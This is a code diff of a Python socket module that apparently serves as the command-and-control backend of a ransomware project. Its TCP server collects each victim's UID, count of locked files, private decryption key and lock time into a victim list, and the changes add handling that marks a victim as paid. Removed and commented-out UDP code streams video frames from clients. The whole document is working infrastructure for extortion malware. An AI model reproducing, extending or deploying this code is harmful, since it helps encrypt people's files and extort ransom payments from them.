@@ -3,19 +3,15 @@ import threading
 import json
 import threading
 import os
-import cv2
-import tkinter as tk
-import numpy as np
-from PIL import Image,ImageTk
+
 class MySocket:
     class Server:
         def __init__(self):
-            self.__hostIP = "0.0.0.0"
+            self.__hostIP = "127.0.0.1"
             self.__tcpPort = 8080
-            self.__udpPort = 8081
             self.__tcpSocket = None
             self.__udpSocket = None
-            self.clients = []
+            self.stopEvent = threading.Event()
 
         def startTCPServer(self):
             def handleClient(clientSocket,address):
@@ -29,19 +25,25 @@ class MySocket:
 
                 testPath,__rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
                 req = clientSocket.recv(4096)
-                req = json.load(req.decode("utf-8"))
-
-                self.clients[req["UID"]] = address
-
+                req = json.loads(req.decode("utf-8"))
+                print(f"Victim Data:{req}")
                 victimList = readJson(testPath)
-                victimData = {
-                    "UID": req["UID"],
-                    "fileNumber": req["fileNumber"],
-                    "privateKey": req["privateKey"],
-                    "date": req["lockTime"],
-                    "paid": False
-                }
-                victimList.append(victimData)
+
+                if req["padding"] == True:
+                    UID = req["UID"]
+                    for i in range(len(victimList)):
+                        if victimList[i]["UID"] == UID:
+                            victimList[i]["paid"] = True
+                            break
+                else:
+                    newVictimData = {
+                        "UID": req["UID"],
+                        "fileNumber": req["fileNumber"],
+                        "privateKey": req["privateKey"],
+                        "date": req["lockTime"],
+                        "paid": False
+                    }
+                    victimList.append(newVictimData)
                 writeJson(testPath,victimList)
 
             self.__tcpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -49,51 +51,52 @@ class MySocket:
             self.__tcpSocket.listen(20)
             print("start TCP server")
 
-            while True:
-                clientSocket,address = self.__tcpSocket.accept()
-                threading.Thread(target=handleClient,args=(clientSocket,address)).start()
+            while not self.stopEvent.is_set():
+                try:
+                    clientSocket,address = self.__tcpSocket.accept()
+                    handleClient(clientSocket,address)
+                except OSError:
+                    break
 
-        def startUDPServer(self):
-            def handleClient():
-                self.__udpSocket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-                self.__udpSocket.bind((self.__hostIP,self.__udpPort))
-                print("start UPD server")
 
-                root = tk.Tk()
-                width, height= 480,360 
-                root.geometry(f"{width}x{height}")
-                root.resizable(False, False)
-                v = tk.Label(root,image=None)
-                v.pack(fill="both",expand=True)
+        def stopTCPServer(self):
+            self.stopEvent.set()
+            if(self.__tcpSocket):
+                self.__tcpSocket.close()
 
-                root.mainloop()
-                while True:
-                    data,address = self.__udpSocket.recvfrom(4096)
-                    root.title(str(address))
-                    frame = np.frombuffer(data,dtype=np.uint8)
-                    frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
-                    frame = frame.resize((480,360))
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) 
-                    img = Image.fromarray(frame)
-                    img = ImageTk.PhotoImage(image=img)
-                    v.config(image=img)
-                    v.image = frame
-                    root.update()
+        # def startUDPServer(self):
+        #     def handleClient():
+        #         self.__udpSocket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        #         self.__udpSocket.bind((self.__hostIP,self.__udpPort))
+        #         print("start UPD server")
+
+        #         while True:
+        #             data,address = self.__udpSocket.recvfrom(4096)
+        #             frame = np.frombuffer(data,dtype=np.uint8)
+        #             frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
+        #             frame = frame.resize((480,360))
+        #             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) 
+        #             img = Image.fromarray(frame)
+        #             img = ImageTk.PhotoImage(image=img)
+        #             self.video = img
                 
-            threading.Thread(target=handleClient).start()
+        #     threading.Thread(target=handleClient).start()
 
     class Client:
         def __init__(self,):
             self.__serverIP = "127.0.0.1"
-            self.__tcpPort = 8080
-            self.__udpPort = 8081
+        
+        def sendTCPMeg(self,data,port):
+            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((self.__serverIP,port))
+            
+            connect = False
+            while not connect:
+                try:
+                    s.send(json.dumps(data).encode("utf-8"))
+                    connect = True
+                    print(connect)
+                except ConnectionResetError as e:
+                    pass
 
-# Example usage:
-if __name__ == "__main__":
-    server = MySocket.Server()
-    server_thread = threading.Thread(target=server.start)
-    server_thread.start()
-
-    client = MySocket.Client()
-    client.send_tcp_message("Hello, TCP Server!")
-    client.send_udp_message("Hello, UDP Server!")
+            #s.send(data.encode())
